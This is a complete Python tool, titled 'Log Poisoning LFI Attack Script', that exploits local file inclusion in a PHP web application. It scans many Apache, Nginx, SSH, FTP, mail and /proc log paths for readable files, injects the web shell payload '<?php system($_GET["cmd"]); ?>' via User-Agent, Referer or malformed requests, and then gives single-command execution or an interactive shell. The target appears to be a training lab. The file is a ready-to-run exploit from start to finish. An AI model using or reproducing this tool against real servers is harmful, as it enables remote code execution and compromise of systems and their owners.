#!/usr/bin/env python3

import requests
import sys
import argparse
import urllib.parse
from bs4 import BeautifulSoup
import re
from typing import Optional, Dict, List, Tuple

class LogPoisoner:
    def __init__(self, target_url, param="language"):
        self.target_url = target_url
        self.param = param
        self.session = requests.Session()
        self.vulnerable_log = None
        self.log_type = None
        self.default_ua = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        
        # Define log files and their poisoning methods
        self.log_locations = {
            'apache_access': {
                'paths': [
                    '/var/log/apache2/access.log',
                    '/var/log/apache/access.log',
                    '/var/log/httpd/access_log',
                    '/var/log/httpd-access.log',
                    'C:\\xampp\\apache\\logs\\access.log',
                    'C:\\Apache24\\logs\\access.log',
                    '/usr/local/apache2/logs/access_log',
                    '/var/www/logs/access_log',
                    '/opt/lampp/logs/access_log'
                ],
                'method': 'user_agent',
                'description': 'Apache Access Log (User-Agent)'
            },
            'nginx_access': {
                'paths': [
                    '/var/log/nginx/access.log',
                    '/var/log/nginx/access_log',
                    'C:\\nginx\\logs\\access.log',
                    '/usr/local/nginx/logs/access.log',
                    '/var/www/logs/nginx_access.log'
                ],
                'method': 'user_agent',
                'description': 'Nginx Access Log (User-Agent)'
            },
            'apache_error': {
                'paths': [
                    '/var/log/apache2/error.log',
                    '/var/log/apache/error.log',
                    '/var/log/httpd/error_log',
                    '/var/log/httpd-error.log',
                    'C:\\xampp\\apache\\logs\\error.log',
                    'C:\\Apache24\\logs\\error.log',
                    '/usr/local/apache2/logs/error_log',
                    '/var/www/logs/error_log'
                ],
                'method': 'malformed_request',
                'description': 'Apache Error Log (Malformed Request)'
            },
            'nginx_error': {
                'paths': [
                    '/var/log/nginx/error.log',
                    '/var/log/nginx/error_log',
                    'C:\\nginx\\logs\\error.log',
                    '/usr/local/nginx/logs/error.log'
                ],
                'method': 'malformed_request',
                'description': 'Nginx Error Log (Malformed Request)'
            },
            'ssh': {
                'paths': [
                    '/var/log/auth.log',
                    '/var/log/secure',
                    '/var/log/sshd.log',
                    'C:\\Windows\\System32\\winevt\\Logs\\Security.evtx'
                ],
                'method': 'ssh_username',
                'description': 'SSH Log (Username)'
            },
            'ftp': {
                'paths': [
                    '/var/log/vsftpd.log',
                    '/var/log/proftpd/proftpd.log',
                    '/var/log/ftp.log',
                    '/var/log/xferlog'
                ],
                'method': 'ftp_username',
                'description': 'FTP Log (Username)'
            },
            'mail': {
                'paths': [
                    '/var/log/mail.log',
                    '/var/log/mail',
                    '/var/log/maillog',
                    '/var/mail/www-data'
                ],
                'method': 'mail_field',
                'description': 'Mail Log (Email fields)'
            },
            'proc_environ': {
                'paths': [
                    '/proc/self/environ',
                    '/proc/self/fd/0',
                    '/proc/self/fd/1',
                    '/proc/self/fd/2'
                ],
                'method': 'user_agent',
                'description': 'Process Environment (User-Agent)'
            }
        }
    
    def test_log_readability(self, log_path: str) -> Tuple[bool, str]:
        """Test if a log file is readable via LFI"""
        test_url = f"{self.target_url}?{self.param}={log_path}"
        
        try:
            response = self.session.get(test_url, timeout=10)
            
            # Check for indicators that we read the log
            indicators = [
                'GET /',
                'POST /',
                'User-Agent:',
                'Mozilla',
                'HTTP/',
                'Connection:',
                'Accept:',
                '[error]',
                '[notice]',
                'Failed password',
                'Accepted password'
            ]
            
            if response.status_code == 200:
                for indicator in indicators:
                    if indicator in response.text:
                        return True, response.text
            
            return False, ""
            
        except Exception as e:
            return False, ""
    
    def scan_logs(self) -> List[Dict]:
        """Scan all log locations to find readable ones"""
        print("\n" + "="*60)
        print("[*] Scanning for readable log files...")
        print("="*60 + "\n")
        
        vulnerable_logs = []
        
        for log_type, log_info in self.log_locations.items():
            print(f"[*] Testing {log_info['description']}...")
            
            for log_path in log_info['paths']:
                sys.stdout.write(f"    Checking: {log_path}... ")
                sys.stdout.flush()
                
                readable, content = self.test_log_readability(log_path)
                
                if readable:
                    print("\033[92m✓ READABLE\033[0m")
                    vulnerable_logs.append({
                        'path': log_path,
                        'type': log_type,
                        'method': log_info['method'],
                        'description': log_info['description'],
                        'content_preview': content[:200]
                    })
                else:
                    print("\033[91m✗\033[0m")
        
        return vulnerable_logs
    
    def poison_user_agent(self, log_path: str) -> bool:
        """Poison log via User-Agent header"""
        php_payload = '<?php system($_GET["cmd"]); ?>'
        
        # Make request with poisoned User-Agent
        headers = {
            'User-Agent': php_payload
        }
        
        poison_url = f"{self.target_url}?{self.param}={log_path}"
        
        try:
            response = requests.get(poison_url, headers=headers, timeout=10)
            return response.status_code == 200
        except:
            return False
    
    def poison_malformed_request(self, log_path: str) -> bool:
        """Poison error log via malformed request"""
        php_payload = '<?php system($_GET["cmd"]); ?>'
        
        # Create malformed request that will be logged in error log
        malformed_url = f"{self.target_url}?{self.param}={urllib.parse.quote(php_payload)}"
        
        try:
            # Send malformed request
            requests.get(malformed_url, timeout=10)
            return True
        except:
            return False
    
    def poison_via_referer(self, log_path: str) -> bool:
        """Poison log via Referer header"""
        php_payload = '<?php system($_GET["cmd"]); ?>'
        
        headers = {
            'Referer': php_payload,
            'User-Agent': self.default_ua
        }
        
        poison_url = f"{self.target_url}?{self.param}={log_path}"
        
        try:
            response = requests.get(poison_url, headers=headers, timeout=10)
            return response.status_code == 200
        except:
            return False
    
    def poison_log(self, log_path: str, method: str) -> bool:
        """Poison the log file based on the method"""
        print(f"[*] Poisoning log with method: {method}")
        
        if method == 'user_agent':
            return self.poison_user_agent(log_path)
        elif method == 'malformed_request':
            return self.poison_malformed_request(log_path)
        elif method == 'referer':
            return self.poison_via_referer(log_path)
        else:
            print(f"[-] Unknown poisoning method: {method}")
            return False
    
    def execute_command(self, command: str) -> Optional[str]:
        """Execute a command via the poisoned log"""
        if not self.vulnerable_log:
            print("[-] No vulnerable log selected")
            return None
        
        # Re-poison the log
        if not self.poison_log(self.vulnerable_log, self.log_type['method']):
            print("[-] Failed to re-poison log")
            return None
        
        # Execute the command
        encoded_cmd = urllib.parse.quote(command)
        exec_url = f"{self.target_url}?{self.param}={self.vulnerable_log}&cmd={encoded_cmd}"
        
        # Use default User-Agent for execution request
        headers = {
            'User-Agent': self.default_ua
        }
        
        try:
            response = requests.get(exec_url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                # Try to extract command output
                output = self.extract_output(response.text, command)
                return output
            else:
                return f"Request failed with status: {response.status_code}"
                
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def extract_output(self, html: str, command: str) -> str:
        """Extract command output from HTML response"""
        # Parse HTML
        soup = BeautifulSoup(html, 'html.parser')
        
        # Remove script and style elements
        for script in soup(["script", "style", "header", "footer", "nav"]):
            script.decompose()
        
        # Get text
        text = soup.get_text()
        
        # Split into lines and clean
        lines = [line.strip() for line in text.split('\n') if line.strip()]
        
        # Try to find command output
        # Look for patterns that indicate command output
        output_lines = []
        in_output = False
        
        for i, line in enumerate(lines):
            # Skip common HTML/page elements
            if any(skip in line.lower() for skip in ['<!doctype', '<html', '</html>', 'containers', 'inlane freight']):
                continue
            
            # Look for our command or its output
            if command in line or 'uid=' in line or 'total' in line or 'root:' in line:
                in_output = True
            
            if in_output and line and len(line) < 500:
                output_lines.append(line)
        
        if output_lines:
            return '\n'.join(output_lines[:50])  # Limit output
        
        # Fallback: return raw text (truncated)
        return '\n'.join(lines[:30]) if lines else "No output captured"
    
    def interactive_shell(self):
        """Provide an interactive shell"""
        print("\n" + "="*60)
        print("[+] Starting interactive shell")
        print(f"[*] Log file: {self.vulnerable_log}")
        print(f"[*] Poison method: {self.log_type['method']}")
        print("[*] Type 'exit' or 'quit' to quit")
        print("[!] Log is re-poisoned before each command")
        print("="*60 + "\n")
        
        while True:
            try:
                cmd = input("\033[1;32m$\033[0m ")
                
                if cmd.lower() in ['exit', 'quit']:
                    print("[*] Exiting...")
                    break
                
                if not cmd.strip():
                    continue
                
                output = self.execute_command(cmd)
                if output:
                    print(output)
                print()
                
            except KeyboardInterrupt:
                print("\n[!] Interrupted")
                break
            except Exception as e:
                print(f"[-] Error: {e}")
    
    def select_log(self, vulnerable_logs: List[Dict]) -> bool:
        """Let user select which log to exploit"""
        if not vulnerable_logs:
            print("[-] No vulnerable logs found")
            return False
        
        print("\n" + "="*60)
        print("[+] Found readable log files:")
        print("="*60)
        
        for idx, log in enumerate(vulnerable_logs, 1):
            print(f"\n[{idx}] {log['description']}")
            print(f"    Path: {log['path']}")
            print(f"    Method: {log['method']}")
            print(f"    Preview: {log['content_preview'][:80]}...")
        
        print("\n" + "="*60)
        
        while True:
            try:
                choice = input(f"Select log to exploit (1-{len(vulnerable_logs)}) [1]: ").strip()
                
                if not choice:
                    choice = "1"
                
                choice = int(choice)
                
                if 1 <= choice <= len(vulnerable_logs):
                    selected = vulnerable_logs[choice - 1]
                    self.vulnerable_log = selected['path']
                    self.log_type = selected
                    print(f"\n[+] Selected: {selected['description']}")
                    print(f"[+] Path: {selected['path']}")
                    return True
                else:
                    print(f"[-] Please enter a number between 1 and {len(vulnerable_logs)}")
                    
            except ValueError:
                print("[-] Please enter a valid number")
            except KeyboardInterrupt:
                print("\n[!] Cancelled")
                return False
    
    def run(self, command: Optional[str] = None, log_path: Optional[str] = None):
        """Main execution flow"""
        print("\n" + "="*60)
        print("    Log Poisoning LFI Attack Script")
        print("="*60)
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Parameter: {self.param}")
        
        # If log path provided, use it directly
        if log_path:
            print(f"\n[*] Using provided log: {log_path}")
            
            # Test if readable
            readable, _ = self.test_log_readability(log_path)
            if not readable:
                print("[-] Provided log is not readable")
                return False
            
            print("[+] Log is readable")
            
            # Determine log type and method
            found_type = None
            for log_type, log_info in self.log_locations.items():
                if log_path in log_info['paths']:
                    found_type = {
                        'method': log_info['method'],
                        'description': log_info['description'],
                        'path': log_path
                    }
                    break
            
            if not found_type:
                print("[!] Unknown log type, defaulting to User-Agent poisoning")
                found_type = {
                    'method': 'user_agent',
                    'description': 'Custom log',
                    'path': log_path
                }
            
            self.vulnerable_log = log_path
            self.log_type = found_type
            
        else:
            # Scan for vulnerable logs
            vulnerable_logs = self.scan_logs()
            
            if not vulnerable_logs:
                print("\n[-] No readable logs found")
                return False
            
            # Let user select log
            if not self.select_log(vulnerable_logs):
                return False
        
        # Test poisoning
        print(f"\n[*] Testing log poisoning...")
        if not self.poison_log(self.vulnerable_log, self.log_type['method']):
            print("[-] Failed to poison log")
            return False
        
        print("[+] Log poisoned successfully")
        
        # Execute command or start shell
        if command:
            print(f"\n[*] Executing single command: {command}")
            output = self.execute_command(command)
            print("\n[+] Command output:")
            print("-" * 60)
            print(output)
            print("-" * 60)
        else:
            self.interactive_shell()
        
        return True


def main():
    parser = argparse.ArgumentParser(
        description='Log Poisoning LFI Attack Script',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Scan for vulnerable logs and interactive mode
  python3 log_poison.py -u http://target.com/index.php
  
  # Execute single command
  python3 log_poison.py -u http://target.com/index.php -c "ls -la"
  
  # Use specific log file
  python3 log_poison.py -u http://target.com/index.php -l /var/log/apache2/access.log
  
  # Custom parameter name
  python3 log_poison.py -u http://target.com/index.php -p page -c "id"
  
  # Specific log with command
  python3 log_poison.py -u http://target.com/index.php -l /var/log/nginx/access.log -c "whoami"
        '''
    )
    
    parser.add_argument('-u', '--url', required=True,
                       help='Target URL (e.g., http://target.com/index.php)')
    parser.add_argument('-p', '--param', default='language',
                       help='Vulnerable parameter name (default: language)')
    parser.add_argument('-c', '--command',
                       help='Single command to execute (default: interactive mode)')
    parser.add_argument('-l', '--log',
                       help='Specific log file path to use (skips scanning)')
    
    args = parser.parse_args()
    
    # Create poisoner instance
    poisoner = LogPoisoner(args.url, args.param)
    
    # Run the attack
    try:
        poisoner.run(args.command, args.log)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()